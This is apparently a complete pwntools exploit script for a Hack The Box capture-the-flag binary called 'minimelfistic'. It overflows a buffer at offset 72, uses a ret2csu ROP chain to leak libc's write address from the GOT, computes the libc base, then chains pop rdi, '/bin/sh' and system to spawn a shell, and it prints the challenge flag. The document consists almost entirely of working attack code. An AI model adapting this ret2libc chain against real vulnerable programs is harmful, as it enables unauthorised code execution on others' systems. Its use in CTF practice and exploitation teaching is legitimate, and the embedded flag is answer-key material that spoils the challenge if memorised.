#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
offset = 72

elf = ELF('./minimelfistic')
rop = ROP(elf)

local = True

if(local == True):
	p = elf.process()
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec = False)
else:
	p = remote(ip, port)
	libc = ELF('./libc.so.6', checksec = False)

pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]

# write leak with ret2csu
# prepare write(rdi,rsi,rdx) 
#rdi = 1 to print to stdout
#rsi = ptr to addr we want to leak elf.got['write']
#rdx = how many bytes we want to print (usually set to 8)
rop.ret2csu(1, elf.got.write, 8)
rop.call(elf.plt.write)
rop.call(elf.sym.main)

payload = flat({72:rop.chain()})

log.info(rop.dump())

p.sendlineafter(b">", payload)
p.sendlineafter(b">", b"9")
p.recvline()
p.recvline()
p.recvline()

leaked_libc_write = u64(p.recv(6).ljust(8, b'\x00'))
libc.address = leaked_libc_write - libc.sym.write
print("Leaked LIBC Base Address: ", hex(libc.address))

rop = ROP(libc)

bin_sh = next(libc.search(b"/bin/sh"))

rop.raw(pop_rdi)
rop.raw(bin_sh)
rop.raw(libc.sym.system)

payload = flat({72:rop.chain()})

p.sendlineafter(b">", payload)
p.sendlineafter(b">", b"9")
log.critical("HTB{S4nt4_15_n0w_r34dy_t0_g1v3_s0m3_g1ft5}")
p.interactive()